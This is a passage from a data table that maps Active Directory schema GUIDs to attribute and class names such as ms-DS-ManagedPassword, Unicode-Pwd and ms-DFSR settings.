""LSA-Creation-Time"",\n    ""5eb526d7-d71b-44ae-8cc6-95460052e6ac"": ""ms-DFSR-ComputerReferenceBL"",\n    ""bf9679e6-0de6-11d0-a285-00aa003049e2"": ""Object-Class-Category"",\n    ""bf967a45-0de6-11d0-a285-00aa003049e2"": ""System-Must-Contain"",\n    ""8ae70db5-6406-4196-92fe-f3bb557520a7"": ""ms-Imaging-Hash-Algorithm"",\n    ""da83fc4f-076f-4aea-b4dc-8f4dab9b5993"": ""ms-DS-Quota-Container"",\n    ""2a39c5b1-8960-11d1-aebc-0000f80367c1"": ""Certificate-Templates"",\n    ""bf9679ae-0de6-11d0-a285-00aa003049e2"": ""LSA-Modified-Count"",\n    ""eb20e7d6-32ad-42de-b141-16ad2631b01b"": ""ms-DFSR-Priority"",\n    ""9a7ad94b-ca53-11d1-bbd0-0080c76670c0"": ""Object-Classes"",\n    ""bf967a46-0de6-11d0-a285-00aa003049e2"": ""System-Only"",\n    ""3f78c3e5-f79a-46bd-a0b8-9d18116ddc79"": ""ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity"",\n    ""e15334a3-0bf0-4427-b672-11f5d84acc92"": ""msSFU-30-Network-User"",\n    ""548e1c22-dea6-11d0-b010-0000f80367c1"": ""Class-Display-Name"",\n    ""bf9679af-0de6-11d0-a285-00aa003049e2"": ""Machine-Architecture"",\n    ""817cf0b8-db95-4914-b833-5a079ef65764"": ""ms-DFSR-DeletedPath"",\n    ""34aaa216-b699-11d0-afee-0000f80367c1"": ""Object-Count"",\n    ""bf967a47-0de6-11d0-a285-00aa003049e2"": ""System-Poss-Superiors"",\n    ""e362ed86-b728-0842-b27d-2dea7a9df218"": ""ms-DS-ManagedPassword"",\n    ""de91fc26-bd02-4b52-ae26-795999e96fc7"": ""ms-DS-Quota-Control"",\n    ""bf967938-0de6-11d0-a285-00aa003049e2"": ""Code-Page"",\n    ""c9b6358e-bb38-11d0-afef-0000f80367c1"": ""Machine-Password-Change-Interval"",\n    ""53ed9ad1-9975-41f4-83f5-0c061a12553a"": ""ms-DFSR-DeletedSizeInMb"",\n    ""bf9679e7-0de6-11d0-a285-00aa003049e2"": ""Object-Guid"",\n    ""bf967a49-0de6-11d0-a285-00aa003049e2"": ""Telephone-Number"",\n    ""0e78295a-c6d3-0a40-b491-d62251ffa0a6"": ""ms-DS-ManagedPasswordId"",\n    ""faf733d0-f8eb-4dcf-8d75-f1753af6a50b"": ""msSFU-30-NIS-Map-Config"",\n    ""bf96793b-0de6-11d0-a285-00aa003049e2"": ""COM-ClassID"",\n    ""bf9679b2-0de6-11d0-a285-00aa003049e2"": ""Machine-Role"",\n    ""5ac48021-e447-46e7-9d23-92c0c6a90dfb"": ""ms-DFSR-ReadOnly"",\n    ""bf9679e8-0de6-11d0-a285-00aa003049e2"": ""Object-Sid"",\n    ""bf967a4a-0de6-11d0-a285-00aa003049e2"": ""Teletex-Terminal-Identifier"",\n    ""d0d62131-2d4a-d04f-99d9-1c63646229a4"": ""ms-DS-ManagedPasswordPreviousId"",\n    ""ce206244-5827-4a86-ba1c-1c0c386c1b64"": ""ms-DS-Managed-Service-Account"",\n    ""281416d9-1968-11d0-a28f-00aa003049e2"": ""COM-CLSID"",\n    ""80a67e4f-9f22-11d0-afdd-00c04fd930c9"": ""Machine-Wide-Policy"",\n    ""db7a08e7-fc76-4569-a45f-f5ecb66a88b5"": ""ms-DFSR-CachePolicy"",\n    ""16775848-47f3-11d1-a9c3-0000f80367c1"": ""Object-Version"",\n    ""bf967a4b-0de6-11d0-a285-00aa003049e2"": ""Telex-Number"",\n    ""f8758ef7-ac76-8843-a2ee-a26b4dcaf409"": ""ms-DS-ManagedPasswordInterval"",\n    ""1cb81863-b822-4379-9ea2-5ff7bdc6386d"": ""ms-net-ieee-80211-GroupPolicy"",\n    ""bf96793c-0de6-11d0-a285-00aa003049e2"": ""COM-InterfaceID"",\n    ""0296c120-40da-11d1-a9c0-0000f80367c1"": ""Managed-By"",\n    ""4c5d607a-ce49-444a-9862-82a95f5d1fcc"": ""ms-DFSR-MinDurationCacheInMin"",\n    ""bf9679ea-0de6-11d0-a285-00aa003049e2"": ""OEM-Information"",\n    ""0296c121-40da-11d1-a9c0-0000f80367c1"": ""Telex-Primary"",\n    ""888eedd6-ce04-df40-b462-b8a50e41ba38"": ""ms-DS-GroupMSAMembership"",\n    ""281416dd-1968-11d0-a28f-00aa003049e2"": ""COM-Other-Prog-Id"",\n    ""0296c124-40da-11d1-a9c0-0000f80367c1"": ""Managed-Objects"",\n    ""2ab0e48d-ac4e-4afc-83e5-a34240db6198"": ""ms-DFSR-MaxAgeInCacheInMin"",\n    ""bf9679ec-0de6-11d0-a285-00aa003049e2"": ""OM-Object-Class"",\n    ""ed9de9a0-7041-11d2-9905-0000f87a57d4"": ""Template-Roots"",\n    ""55872b71-c4b2-3b48-ae51-4095f91ec600"": ""ms-DS-Transformation-Rules"",\n    ""99a03a6a-ab19-4446-9350-0cb878ed2d9b"": ""ms-net-ieee-8023-GroupPolicy"",\n    ""bf96793d-0de6-11d0-a285-00aa003049e2"": ""COM-ProgID"",\n    ""bf9679b5-0de6-11d0-a285-00aa003049e2"": ""Manager"",\n    ""43061ac1-c8ad-4ccc-b785-2bfac20fc60a"": ""ms-FVE-RecoveryPassword"",\n    ""bf9679ed-0de6-11d0-a285-00aa003049e2"": ""OM-Syntax"",\n    ""6db69a1c-9422-11d1-aebd-0000f80367c1"": ""Terminal-Server"",\n    ""86284c08-0c6e-1540-8b15-75147d23d20d"": ""ms-DS-Ingress-Claims-Transformation-Policy"",\n    ""fa85c591-197f-477e-83bd-ea5a43df2239"": ""ms-DFSR-LocalSettings"",\n    ""281416db-1968-11d0-a28f-00aa003049e2"": ""COM-Treat-As-Class-Id"",\n    ""bf9679b7-0de6-11d0-a285-00aa003049e2"": ""MAPI-ID"",\n    ""85e5a5cf-dcee-4075-9cfd-ac9db6a2f245"": ""ms-FVE-VolumeGuid"",\n    ""ddac0cf3-af8f-11d0-afeb-00c04fd930c9"": ""OMT-Guid"",\n    ""f0f8ffa7-1191-11d0-a060-00aa006c33ed"": ""Text-Country"",\n    ""c137427e-9a73-b040-9190-1b095bb43288"": ""ms-DS-Egress-Claims-Transformation-Policy"",\n    ""ea715d30-8f53-40d0-bd1e-6109186d782c"": ""ms-FVE-RecoveryInformation"",\n    ""281416de-1968-11d0-a28f-00aa003049e2"": ""COM-Typelib-Id"",\n    ""bf9679b9-0de6-11d0-a285-00aa003049e2"": ""Marshalled-Interface"",\n    ""1fd55ea8-88a7-47dc-8129-0daa97186a54"": ""ms-FVE-KeyPackage"",\n    ""1f0075fa-7e40-11d0-afd6-00c04fd930c9"": ""OMT-Indx-Guid"",\n    ""a8df7489-c5ea-11d1-bbcb-0080c76670c0"": ""Text-Encoded-OR-Address"",\n    ""d5006229-9913-2242-8b17-83761d1e0e5b"": ""ms-DS-TDO-Egress-BL"",\n    ""e11505d7-92c4-43e7-bf5c-295832ffc896"": ""ms-DFSR-Subscriber"",\n    ""281416da-1968-11d0-a28f-00aa003049e2"": ""COM-Unique-LIBID"",\n    ""e48e64e0-12c9-11d3-9102-00c04fd91ab1"": ""Mastered-By"",\n    ""f76909bc-e678-47a0-b0b3-f86a0044c06d"": ""ms-FVE-RecoveryGuid"",\n    ""3e978925-8c01-11d0-afda-00c04fd930c9"": ""Operating-System"",\n    ""ddac0cf1-af8f-11d0-afeb-00c04fd930c9"": ""Time-Refresh"",\n    ""5a5661a1-97c6-544b-8056-e430fe7bc554"": ""ms-DS-TDO-Ingress-BL"",\n    ""25173408-04ca-40e8-865e-3f9ce9bf1bd3"": ""ms-DFS-Deleted-Link-v2"",\n    ""bf96793e-0de6-11d0-a285-00aa003049e2"": ""Comment"",\n    ""bf9679bb-0de6-11d0-a285-00aa003049e2"": ""Max-Pwd-Age"",\n    ""aa4e1a6d-550d-4e05-8c35-4afcb917a9fe"": ""ms-TPM-OwnerInformation"",\n    ""bd951b3c-9c96-11d0-afdd-00c04fd930c9"": ""Operating-System-Hotfix"",\n    ""ddac0cf0-af8f-11d0-afeb-00c04fd930c9"": ""Time-Vol-Change"",\n    ""0bb49a10-536b-bc4d-a273-0bab0dd4bd10"": ""ms-DS-Transformation-Rules-Compiled"",\n    ""67212414-7bcc-4609-87e0-088dad8abdee"": ""ms-DFSR-Subscription"",\n    ""bf96793f-0de6-11d0-a285-00aa003049e2"": ""Common-Name"",\n    ""bf9679bc-0de6-11d0-a285-00aa003049e2"": ""Max-Renew-Age"",\n    ""0e0d0938-2658-4580-a9f6-7a0ac7b566cb"": ""ms-ieee-80211-Data"",\n    ""3e978927-8c01-11d0-afda-00c04fd930c9"": ""Operating-System-Service-Pack"",\n    ""bf967a55-0de6-11d0-a285-00aa003049e2"": ""Title"",\n    ""693f2006-5764-3d4a-8439-58f04aab4b59"": ""ms-DS-Applies-To-Resource-Types"",\n    ""7769fb7a-1159-4e96-9ccd-68bc487073eb"": ""ms-DFS-Link-v2"",\n    ""f0f8ff88-1191-11d0-a060-00aa006c33ed"": ""Company"",\n    ""bf9679bd-0de6-11d0-a285-00aa003049e2"": ""Max-Storage"",\n    ""6558b180-35da-4efe-beed-521f8f48cafb"": ""ms-ieee-80211-Data-Type"",\n    ""3e978926-8c01-11d0-afda-00c04fd930c9"": ""Operating-System-Version"",\n    ""16c3a860-1273-11d0-a060-00aa006c33ed"": ""Tombstone-Lifetime"",\n    ""24977c8c-c1b7-3340-b4f6-2b375eb711d7"": ""ms-DS-RID-Pool-Allocation-Enabled"",\n    ""7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6"": ""ms-DFSR-GlobalSettings"",\n    ""bf967943-0de6-11d0-a285-00aa003049e2"": ""Content-Indexing-Allowed"",\n    ""bf9679be-0de6-11d0-a285-00aa003049e2"": ""Max-Ticket-Age"",\n    ""7f73ef75-14c9-4c23-81de-dd07a06f9e8b"": ""ms-ieee-80211-ID"",\n    ""bf9679ee-0de6-11d0-a285-00aa003049e2"": ""Operator-Count"",\n    ""c1dc867c-a261-11d1-b606-0000f80367c1"": ""Transport-Address-Attribute"",\n    ""9709eaaf-49da-4db2-908a-0446e5eab844"": ""ms-DS-cloudExtensionAttribute1"",\n    ""da73a085-6e64-4d61-b064-015d04164795"": ""ms-DFS-Namespace-Anchor"",\n    ""4d8601ee-ac85-11d0-afe3-00c04fd930c9"": ""Context-Menu"",\n    ""bf9679bf-0de6-11d0-a285-00aa003049e2"": ""May-Contain"",\n    ""8a5c99e9-2230-46eb-b8e8-e59d712eb9ee"": ""ms-IIS-FTP-Dir"",\n    ""963d274d-48be-11d1-a9c3-0000f80367c1"": ""Option-Description"",\n    ""26d97372-6070-11d1-a9c6-0000f80367c1"": ""Transport-DLL-Name"",\n    ""f34ee0ac-c0c1-4ba9-82c9-1a90752f16a5"": ""ms-DS-cloudExtensionAttribute2"",\n    ""1c332fe0-0c2a-4f32-afca-23c5e45a9e77"": ""ms-DFSR-ReplicationGroup"",\n    ""6da8a4fc-0e52-11d0-a286-00aa003049e2"": ""Control-Access-Rights"",\n    ""11b6cc8b-48c4-11d1-a9c3-0000f80367c1"": ""meetingAdvertiseScope"",\n    ""2a7827a4-1483-49a5-9d84-52e3812156b4"": ""ms-IIS-FTP-Root"",\n    ""19195a53-6da0-11d0-afd3-00c04fd930c9"": ""Options"",\n    ""26d97374-6070-11d1-a9c6-0000f80367c1"": ""Transport-Type"",\n    ""82f6c81a-fada-4a0d-b0f7-706d46838eb5"": ""ms-DS-cloudExtensionAttribute3"",\n    ""21cb8628-f3c3-4bbf-bff6-060b2d8f299a"": ""ms-DFS-Namespace-v2"",\n    ""bf967944-0de6-11d0-a285-00aa003049e2"": ""Cost"",\n    ""11b6cc83-48c4-11d1-a9c3-0000f80367c1"": ""meetingApplication"",\n    ""51583ce9-94fa-4b12-b990-304c35b18595"": ""ms-Imaging-PSP-Identifier"",\n    ""963d274e-48be-11d1-a9c3-0000f80367c1"": ""Options-Location"",\n    ""8fd044e3-771f-11d1-aeae-0000f80367c1"": ""Treat-As-Leaf"",\n    ""9cbf3437-4e6e-485b-b291-22b02554273f"": ""ms-DS-cloudExtensionAttribute4"",\n    ""64759b35-d3a1-42e4-b5f1-a3de162109b3"": ""ms-DFSR-Content"",\n    ""508ca374-a511-4e4e-9f4f-856f61a6b7e4"": ""Address-Book-Roots2"",\n    ""5fd42471-1262-11d0-a060-00aa006c33ed"": ""Country-Code"",\n    ""11b6cc92-48c4-11d1-a9c3-0000f80367c1"": ""meetingBandwidth"",\n    ""7b6760ae-d6ed-44a6-b6be-9de62c09ec67"": ""ms-Imaging-PSP-String"",\n    ""bf9679ef-0de6-11d0-a285-00aa003049e2"": ""Organization-Name"",\n    ""28630ebd-41d5-11d1-a9c1-0000f80367c1"": ""Tree-Name"",\n    ""2915e85b-e347-4852-aabb-22e5a651c864"": ""ms-DS-cloudExtensionAttribute5"",\n    ""4898f63d-4112-477c-8826-3ca00bd8277d"": ""Global-Address-List2"",\n    ""bf967945-0de6-11d0-a285-00aa003049e2"": ""Country-Name"",\n    ""11b6cc93-48c4-11d1-a9c3-0000f80367c1"": ""meetingBlob"",\n    ""35697062-1eaf-448b-ac1e-388e0be4fdee"": ""ms-net-ieee-80211-GP-PolicyGUID"",\n    ""bf9679f0-0de6-11d0-a285-00aa003049e2"": ""Organizational-Unit-Name"",\n    ""80a67e5a-9f22-11d0-afdd-00c04fd930c9"": ""Trust-Attributes"",\n    ""60452679-28e1-4bec-ace3-712833361456"": ""ms-DS-cloudExtensionAttribute6"",\n    ""4937f40d-a6dc-4d48-97ca-06e5fbfd3f16"": ""ms-DFSR-ContentSet"",\n    ""b1cba91a-0682-4362-a659-153e201ef069"": ""Template-Roots2"",\n    ""2b09958a-8931-11d1-aebc-0000f80367c1"": ""Create-Dialog"",\n    ""11b6cc87-48c4-11d1-a9c3-0000f80367c1"": ""meetingContactInfo"",\n    ""9c1495a5-4d76-468e-991e-1433b0a67855"": ""ms-net-ieee-80211-GP-PolicyData"",\n    ""28596019-7349-4d2f-adff-5a629961f942"": ""organizationalStatus"",\n    ""bf967a59-0de6-11d0-a285-00aa003049e2"": ""Trust-Auth-Incoming"",\n    ""4a7c1319-e34e-40c2-9d00-60ff7890f207"": ""ms-DS-cloudExtensionAttribute7"",\n    ""2df90d73-009f-11d2-aa4c-00c04fd7d83a"": ""Create-Time-Stamp"",\n    ""11b6cc7e-48c4-11d1-a9c3-0000f80367c1"": ""meetingDescription"",\n    ""0f69c62e-088e-4ff5-a53a-e923cec07c0a"": ""ms-net-ieee-80211-GP-PolicyReserved"",\n    ""5fd424ce-1262-11d0-a060-00aa006c33ed"": ""Original-Display-Table"",\n    ""bf967a5f-0de6-11d0-a285-00aa003049e2"": ""Trust-Auth-Outgoing"",\n    ""3cd1c514-8449-44ca-81c0-021781800d2a"": ""ms-DS-cloudExtensionAttribute8"",\n    ""04828aa9-6e42-4e80-b962-e2fe00754d17"": ""ms-DFSR-Topology"",\n    ""b8442f58-c490-4487-8a9d-d80b883271ad"": ""ms-DS-Claim-Type-Property-Base"",\n    ""2b09958b-8931-11d1-aebc-0000f80367c1"": ""Create-Wizard-Ext"",\n    ""11b6cc91-48c4-11d1-a9c3-0000f80367c1"": ""meetingEndTime"",\n    ""94a7b05a-b8b2-4f59-9c25-39e69baa1684"": ""ms-net-ieee-8023-GP-PolicyGUID"",\n    ""5fd424cf-1262-11d0-a060-00aa006c33ed"": ""Original-Display-Table-MSDOS"",\n    ""bf967a5c-0de6-11d0-a285-00aa003049e2"": ""Trust-Direction"",\n    ""0a63e12c-3040-4441-ae26-cd95af0d247e"": ""ms-DS-cloudExtensionAttribute9"",\n    ""bf967946-0de6-11d0-a285-00aa003049e2"": ""Creation-Time"",\n    ""11b6cc7c-48c4-11d1-a9c3-0000f80367c1"": ""meetingID"",\n    ""8398948b-7457-4d91-bd4d-8d7ed669c9f7"": ""ms-net-ieee-8023-GP-PolicyData"",\n    ""bf9679f1-0de6-11d0-a285-00aa003049e2"": ""Other-Login-Workstations"",\n    ""b000ea7a-a086-11d0-afdd-00c04fd930c9"": ""Trust-Parent"",\n    ""670afcb3-13bd-47fc-90b3-0a527ed81ab7"": ""ms-DS-cloudExtensionAttribute10"",\n    ""4229c897-c211-437c-a5ae-dbf705b696e5"": ""ms-DFSR-Member"",\n    ""36093235-c715-4821-ab6a-b56fb2805a58"": ""ms-DS-Claim-Types"",\n    ""4d8601ed-ac85-11d0-afe3-00c04fd930c9"": ""Creation-Wizard"",\n    ""11b6cc89-48c4-11d1-a9c3-0000f80367c1"": ""meetingIP"",\n    ""d3c527c7-2606-4deb-8cfd-18426feec8ce"": ""ms-net-ieee-8023-GP-PolicyReserved"",\n    ""0296c123-40da-11d1-a9c0-0000f80367c1"": ""Other-Mailbox"",\n    ""bf967a5d-0de6-11d0-a285-00aa003049e2"": ""Trust-Partner"",\n    ""9e9ebbc8-7da5-42a6-8925-244e12a56e24"": ""ms-DS-cloudExtensionAttribute11"",\n    ""7bfdcb85-4807-11d1-a9c3-0000f80367c1"": ""Creator"",\n    ""11b6cc8e-48c4-11d1-a9c3-0000f80367c1"": ""meetingIsEncrypted"",\n    ""3164c36a-ba26-468c-8bda-c1e5cc256728"": ""ms-PKI-Cert-Template-OID"",\n    ""bf9679f2-0de6-11d0-a285-00aa003049e2"": ""Other-Name"",\n    ""bf967a5e-0de6-11d0-a285-00aa003049e2"": ""Trust-Posix-Offset"",\n    ""3c01c43d-e10b-4fca-92b2-4cf615d5b09a"": ""ms-DS-cloudExtensionAttribute12"",\n    ""e58f972e-64b5-46ef-8d8b-bbc3e1897eab"": ""ms-DFSR-Connection"",\n    ""7a4a4584-b350-478f-acd6-b4b852d82cc0"": ""ms-DS-Resource-Properties"",\n    ""963d2737-48be-11d1-a9c3-0000f80367c1"": ""CRL-Object"",\n    ""11b6cc7f-48c4-11d1-a9c3-0000f80367c1"": ""meetingKeyword"",\n    ""dbd90548-aa37-4202-9966-8c537ba5ce32"": ""ms-PKI-Certificate-Application-Policy"",\n    ""1ea64e5d-ac0f-11d2-90df-00c04fd91ab1"": ""Other-Well-Known-Objects"",\n    ""bf967a60-0de6-11d0-a285-00aa003049e2"": ""Trust-Type"",\n    ""28be464b-ab90-4b79-a6b0-df437431d036"": ""ms-DS-cloudExtensionAttribute13"",\n    ""963d2731-48be-11d1-a9c3-0000f80367c1"": ""CRL-Partitioned-Revocation-List"",\n    ""11b6cc84-48c4-11d1-a9c3-0000f80367c1"": ""meetingLanguage"",\n    ""ea1dddc4-60ff-416e-8cc0-17cee534bce7"": ""ms-PKI-Certificate-Name-Flag"",\n    ""bf9679f3-0de6-11d0-a285-00aa003049e2"": ""Owner"",\n    ""bf967a61-0de6-11d0-a285-00aa003049e2"": ""UAS-Compat"",\n    ""cebcb6ba-6e80-4927-8560-98feca086a9f"": ""ms-DS-cloudExtensionAttribute14"",\n    ""7b9a2d92-b7eb-4382-9772-c3e0f9baaf94"": ""ms-ieee-80211-Policy"",\n    ""81a3857c-5469-4d8f-aae6-c27699762604"": ""ms-DS-Claim-Type"",\n    ""167757b2-47f3-11d1-a9c3-0000f80367c1"": ""Cross-Certificate-Pair"",\n    ""11b6cc80-48c4-11d1-a9c3-0000f80367c1"": ""meetingLocation"",\n    ""38942346-cc5b-424b-a7d8-6ffd12029c5f"": ""ms-PKI-Certificate-Policy"",\n    ""7d6c0e99-7e20-11d0-afd6-00c04fd930c9"": ""Package-Flags"",\n    ""0bb0fca0-1e89-429f-901a-1413894d9f59"": ""uid"",\n    ""aae4d537-8af0-4daa-9cc6-62eadb84ff03"": ""ms-DS-cloudExtensionAttribute15"",\n    ""1f0075fe-7e40-11d0-afd6-00c04fd930c9"": ""Curr-Machine-Id"",\n    ""11b6cc85-48c4-11d1-a9c3-0000f80367c1"": ""meetingMaxParticipants"",\n    ""b7ff5a38-0818-42b0-8110-d3d154c97f24"": ""ms-PKI-Credential-Roaming-Tokens"",\n    ""7d6c0e98-7e20-11d0-afd6-00c04fd930c9"": ""Package-Name"",\n    ""bf967a64-0de6-11d0-a285-00aa003049e2"": ""UNC-Name"",\n    ""9581215b-5196-4053-a11e-6ffcafc62c4d"": ""ms-DS-cloudExtensionAttribute16"",\n    ""a0ed2ac1-970c-4777-848e-ec63a0ec44fc"": ""ms-Imaging-PSPs"",\n    ""5b283d5e-8404-4195-9339-8450188c501a"": ""ms-DS-Resource-Property"",\n    ""1f0075fc-7e40-11d0-afd6-00c04fd930c9"": ""Current-Location"",\n    ""11b6cc7d-48c4-11d1-a9c3-0000f80367c1"": ""meetingName"",\n    ""d15ef7d8-f226-46db-ae79-b34e560bd12c"": ""ms-PKI-Enrollment-Flag"",\n    ""7d6c0e96-7e20-11d0-afd6-00c04fd930c9"": ""Package-Type"",\n    ""bf9679e1-0de6-11d0-a285-00aa003049e2"": ""Unicode-Pwd"",\n    ""3d3c6dda-6be8-4229-967e-2ff5bb93b4ce"": ""ms-DS-cloudExtensionAttribute17"",\n    ""963d273f-48be-11d1-a9c3-0000f80367c1"": ""Current-Parent-CA"",\n    ""11b6cc86-48c4-11d1-a9c3-0000f80367c1"": ""meetingOriginator"",\n    ""f22bd38f-a1d0-4832-8b28-0331438886a6"": ""ms-PKI-Enrollment-Servers"",\n    ""5245801b-ca6a-11d0-afff-0000f80367c1"": ""Parent-CA"",\n    ""ba0184c7-38c5-4bed-a526-75421470580c"": ""uniqueIdentifier"",\n    ""88e73b34-0aa6-4469-9842-6eb01b32a5b5"": ""ms-DS-cloudExtensionAttribute18"",\n    ""1f7c257c-b8a3-4525-82f8-11ccc7bee36e"": ""ms-Imaging-PostScanProcess"",\n    ""72e3d47a-b342-4d45-8f56-baff803cabf9"": ""ms-DS-Resource-Property-List"",\n    ""bf967947-0de6-11d0-a285-00aa003049e2"": ""Current-Value"",\n    ""11b6cc88-48c4-11d1-a9c3-0000f80367c1"": ""meetingOwner"",\n    ""e96a63f5-417f-46d3-be52-db7703c503df"": ""ms-PKI-Minimal-Key-Size"",\n    ""963d2733-48be-11d1-a9c3-0000f80367c1"": ""Parent-CA-Certificate-Chain"",\n    ""8f888726-f80a-44d7-b1ee-cb9df21392c8"": ""uniqueMember"",\n    ""0975fe99-9607-468a-8e18-c800d3387395"": ""ms-DS-cloudExtensionAttribute19"",\n    ""bf96799c-0de6-11d0-a285-00aa003049e2"": ""DBCS-Pwd"",\n    ""11b6cc81-48c4-11d1-a9c3-0000f80367c1"": ""meetingProtocol"",\n    ""8c9e1288-5028-4f4f-a704-76d026f246ef"": ""ms-PKI-OID-Attribute"",\n    ""2df90d74-009f-11d2-aa4c-00c04fd7d83a"": ""Parent-GUID"",\n    ""50950839-cc4c-4491-863a-fcf942d684b7"": ""unstructuredAddress"",\n    ""f5446328-8b6e-498d-95a8-211748d5acdc"": ""ms-DS-cloudExtensionAttribute20"",\n    ""a16f33c7-7fd6-4828-9364-435138fda08d"": ""ms-Print-ConnectionPolicy"",\n    ""b72f862b-bb25-4d5d-aa51-62c59bdf90ae"": ""ms-SPP-Activation-Objects-Container"",\n    ""bf967948-0de6-11d0-a285-00aa003049e2"": ""Default-Class-Store"",\n    ""11b6cc8d-48c4-11d1-a9c3-0000f80367c1"": ""meetingRating"",\n    ""5f49940e-a79f-4a51-bb6f-3d446a54dc6b"": ""ms-PKI-OID-CPS"",\n    ""28630ec0-41d5-11d1-a9c1-0000f80367c1"": ""Partial-Attribute-Deletion-List"",\n    ""9c8ef177-41cf-45c9-9673-7716c0c8901b"": ""unstructuredName"",\n    ""6b3d6fda-0893-43c4-89fb-1fb52a6616a9"": ""ms-DS-Issuer-Certificates"",\n    ""720bc4e2-a54a-11d0-afdf-00c04fd930c9"": ""Default-Group"",\n    ""11b6cc8f-48c4-11d1-a9c3-0000f80367c1"": ""meetingRecurrence"",\n    ""7d59a816-bb05-4a72-971f-5c1331f67559"": ""ms-PKI-OID-LocalizedName"",\n    ""19405b9e-3cfa-11d1-a9c0-0000f80367c1"": ""Partial-Attribute-Set"",\n    ""d9e18312-8939-11d1-aebc-0000f80367c1"": ""Upgrade-Product-Code"",\n    ""ca3286c2-1f64-4079-96bc-e62b610e730f"": ""ms-DS-Registration-Quota"",\n    ""37cfd85c-6719-4ad8-8f9e-8678ba627563"": ""ms-PKI-Enterprise-Oid"",\n    ""51a0e68c-0dc5-43ca-935d-c1c911bf2ee5"": ""ms-SPP-Activation-Object"",\n    ""b7b13116-b82e-11d0-afee-0000f80367c1"": ""Default-Hiding-Value"",\n    ""11b6cc8a-48c4-11d1-a9c3-0000f80367c1"": ""meetingScope"",\n    ""04c4da7a-e114-4e69-88de-e293f2d3b395"": ""ms-PKI-OID-User-Notice"",\n    ""07383084-91df-11d1-aebc-0000f80367c1"": ""Pek-Key-Change-Interval"",\n    ""032160bf-9824-11d1-aec0-0000f80367c1"": ""UPN-Suffixes"",\n    ""0a5caa39-05e6-49ca-b808-025b936610e7"": ""ms-DS-Maximum-Registration-Inactivity-Period"",\n    ""bf96799f-0de6-11d0-a285-00aa003049e2"": ""Default-Local-Policy-Object"",\n    ""11b6cc90-48c4-11d1-a9c3-0000f80367c1"": ""meetingStartTime"",\n    ""bab04ac2-0435-4709-9307-28380e7c7001"": ""ms-PKI-Private-Key-Flag"",\n    ""07383083-91df-11d1-aebc-0000f80367c1"": ""Pek-List"",\n    ""bf967a68-0de6-11d0-a285-00aa003049e2"": ""User-Account-Control"",\n    ""e3fb56c8-5de8-45f5-b1b1-d2b6cd31e762"": ""ms-DS-Device-Location"",\n    ""26ccf238-a08e-4b86-9a82-a8c9ac7ee5cb"": ""ms-PKI-Key-Recovery-Agent"",\n    ""e027a8bd-6456-45de-90a3-38593877ee74"": ""ms-TPM-Information-Objects-Container"",\n    ""26d97367-6070-11d1-a9c6-0000f80367c1"": ""Default-Object-Category"",\n    ""11b6cc82-48c4-11d1-a9c3-0000f80367c1"": ""meetingType"",\n    ""0cd8711f-0afc-4926-a4b1-09b08d3d436c"": ""ms-PKI-Site-Name"",\n    ""963d273c-48be-11d1-a9c3-0000f80367c1"": ""Pending-CA-Certificates"",\n    ""bf967a69-0de6-11d0-a285-00aa003049e2"": ""User-Cert"",\n    ""617626e9-01eb-42cf-991f-ce617982237e"": ""ms-DS-Registered-Owner"",\n    ""281416c8-1968-11d0-a28f-00aa003049e2"": ""Default-Priority"",\n    ""11b6cc8c-48c4-11d1-a9c3-0000f80367c1"": ""meetingURL"",\n    ""9de8ae7d-7a5b-421d-b5e4-061f79dfd5d7"": ""ms-PKI-Supersede-Templates"",\n    ""963d273e-48be-11d1-a9c3-0000f80367c1"": ""Pending-Parent-CA"",\n    ""bf967a6a-0de6-11d0-a285-00aa003049e2"": ""User-Comment"",\n    ""0449160c-5a8e-4fc8-b052-01c0f6e48f02"": ""ms-DS-Registered-Users"",\n    ""05f6c878-ccef-11d2-9993-0000f87a57d4"": ""MS-SQL-SQLServer"",\n    ""85045b6a-47a6-4243-a7cc-6890701f662c"": ""ms-TPM-Information-Object"",\n    ""807a6d30-1669-11d0-a064-00aa006c33ed"": ""Default-Security-Descriptor"",\n    ""bf9679c0-0de6-11d0-a285-00aa003049e2"": ""Member"",\n    ""13f5236c-1884-46b1-b5d0-484e38990d58"": ""ms-PKI-Template-Minor-Revision"",\n    ""5fd424d3-1262-11d0-a060-00aa006c33ed"": ""Per-Msg-Dialog-Display-Table"",\n    ""bf967a6d-0de6-11d0-a285-00aa003049e2"": ""User-Parameters"",\n    ""a34f983b-84c6-4f0c-9050-a3a14a1d35a4"": ""ms-DS-Approximate-Last-Logon-Time-Stamp"",\n    ""167757b5-47f3-11d1-a9c3-0000f80367c1"": ""Delta-Revocation-List"",\n    ""0296c122-40da-11d1-a9c0-0000f80367c1"": ""MHS-OR-Address"",\n    ""0c15e9f5-491d-4594-918f-32813a091da9"": ""ms-PKI-Template-Schema-Version"",\n    ""5fd424d4-1262-11d0-a060-00aa006c33ed"": ""Per-Recip-Dialog-Display-Table"",\n    ""bf967a6e-0de6-11d0-a285-00aa003049e2"": ""User-Password"",\n    ""22a95c0e-1f83-4c82-94ce-bea688cfc871"": ""ms-DS-Is-Enabled"",\n    ""0c7e18ea-ccef-11d2-9993-0000f87a57d4"": ""MS-SQL-OLAPServer"",\n    ""ef2fc3ed-6e18-415b-99e4-3114a8cb124b"": ""ms-DNS-Server-Settings"",\n    ""bf96794f-0de6-11d0-a285-00aa003049e2"": ""Department"",\n    ""bf9679c2-0de6-11d0-a285-00aa003049e2"": ""Min-Pwd-Age"",\n    ""3c91fbbf-4773-4ccd-a87b-85d53e7bcf6a"": ""ms-PKI-RA-Application-Policies"",\n    ""16775858-47f3-11d1-a9c3-0000f80367c1"": ""Personal-Title"",\n    ""11732a8a-e14d-4cc5-b92f-d93f51c6d8e4"": ""userClass"",\n    ""100e454d-f3bb-4dcb-845f-8d5edc471c59"": ""ms-DS-Device-OS-Type"",\n    ""be9ef6ee-cbc7-4f22-b27b-96967e7ee585"": ""departmentNumber"",\n    ""bf9679c3-0de6-11d0-a285-00aa003049e2"": ""Min-Pwd-Length"",\n    ""d546ae22-0951-4d47-817e-1c9f96faad46"": ""ms-PKI-RA-Policies"",\n    ""0296c11d-40da-11d1-a9c0-0000f80367c1"": ""Phone-Fax-Other"",\n    ""23998ab5-70f8-4007-a4c1-a84a38311f9a"": ""userPKCS12"",\n    ""70fb8c63-5fab-4504-ab9d-14b329a8a7f8"": ""ms-DS-Device-OS-Version"",\n    ""11d43c5c-ccef-11d2-9993-0000f87a57d4"": ""MS-SQL-SQLRepository"",\n    ""555c21c3-a136-455a-9397-796bbd358e25"": ""ms-Authz-Central-Access-Policies"",\n    